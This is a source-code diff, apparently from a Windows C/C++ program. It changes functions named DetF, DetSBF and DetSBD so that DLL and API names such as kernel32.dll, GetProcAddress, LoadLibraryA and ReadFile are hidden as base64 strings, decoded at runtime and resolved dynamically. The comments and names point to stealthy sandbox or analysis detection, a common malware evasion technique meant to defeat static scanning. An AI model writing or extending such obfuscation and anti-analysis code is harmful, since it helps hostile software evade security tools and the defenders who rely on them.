@@ -132,22 +132,21 @@ bool DetSBF()
 bool DetF()
 {
     // Get a pointer to GetProcAddress
-    pModC pGetProcAddress = (pModC)GetMod("kernel32.dll", "GetProcAddress");
+    pModC pGetProcAddress = (pModC)GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("R2V0UHJvY0FkZHJlc3M="));
     // Get a pointer to GetModuleHandleA
-    pMod pGetModuleHandleA = (pMod)GetMod("kernel32.dll", "GetModuleHandleA");
+    pMod pGetModuleHandleA = (pMod)GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("R2V0TW9kdWxlSGFuZGxlQQ=="));
 
     // Resolve Kernel32 base
-    HMODULE hKernel32 = (HMODULE)pGetModuleHandleA("kernel32.dll");
+    HMODULE hKernel32 = (HMODULE)pGetModuleHandleA(Bsfd("a2VybmVsMzIuZGxs"));
 
     // Resolve API functions dynamically
-    FARPROC pGetModuleFileNameA = pGetProcAddress(hKernel32, "GetModuleFileNameA");
-    pCreateFileA_t pCreateFileA = (pCreateFileA_t)pGetProcAddress(hKernel32, "CreateFileA");
-    pGetFileSize_t pGetFileSize = (pGetFileSize_t)pGetProcAddress(hKernel32, "GetFileSize");
-    pReadFile_t pReadFile = (pReadFile_t)pGetProcAddress(hKernel32, "ReadFile");
-    pCloseHandle_t pCloseHandle = (pCloseHandle_t)pGetProcAddress(hKernel32, "CloseHandle");
+    FARPROC pGetModuleFileNameA = pGetProcAddress(hKernel32, Bsfd("R2V0TW9kdWxlRmlsZU5hbWVB")); // GetModuleFileNameA
+    pCreateFileA_t pCreateFileA = (pCreateFileA_t)pGetProcAddress(hKernel32, Bsfd("Q3JlYXRlRmlsZUE=")); // CreateFileA
+    pGetFileSize_t pGetFileSize = (pGetFileSize_t)pGetProcAddress(hKernel32, Bsfd("R2V0RmlsZVNpemU=")); // GetFileSize
+    pReadFile_t pReadFile = (pReadFile_t)pGetProcAddress(hKernel32, Bsfd("UmVhZEZpbGU=")); // ReadFile
 
     // Ensure all function pointers are valid
-    if (!pGetModuleFileNameA || !pCreateFileA || !pGetFileSize || !pReadFile || !pCloseHandle)
+    if (!pGetModuleFileNameA || !pCreateFileA || !pGetFileSize || !pReadFile)
         return false;
 
     // Retrieve executable path stealthily
@@ -170,7 +169,7 @@ bool DetF()
     pReadFile(hFile, buffer, min(fileSize, sizeof(buffer)), &bytesRead, NULL);
 
     // Close file handle
-    pCloseHandle(hFile);
+    CloseHandle(hFile);
 
     // Implement custom XOR-based hashing instead of using Crypt APIs
     BYTE hash[16] = {0};
@@ -241,9 +240,9 @@ bool DetSBD()
     };
 
     // Get a pointer to GetModuleHandleA
-    pMod pGetModuleHandleA = (pMod)GetMod("kernel32.dll", "GetModuleHandleA");
+    pMod pGetModuleHandleA = (pMod)GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("R2V0TW9kdWxlSGFuZGxlQQ==")); 
     // Get a pointer to LoadLibraryA
-    pMod pLoadLibraryA = (pMod)GetMod("kernel32.dll", "LoadLibraryA");
+    pMod pLoadLibraryA = (pMod)GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("TG9hZExpYnJhcnlB"));
 
     for (int i = 0; i < sizeof(encoded_realDLLs) / sizeof(encoded_realDLLs[0]); i++)
     {
